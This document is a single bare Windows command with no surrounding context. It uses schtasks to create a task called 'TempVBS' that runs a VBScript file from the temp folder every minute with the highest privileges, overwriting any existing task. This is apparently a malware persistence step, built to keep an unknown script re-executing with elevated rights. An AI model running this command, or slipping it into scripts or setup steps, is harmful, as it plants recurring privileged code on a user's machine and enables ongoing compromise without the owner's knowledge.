schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
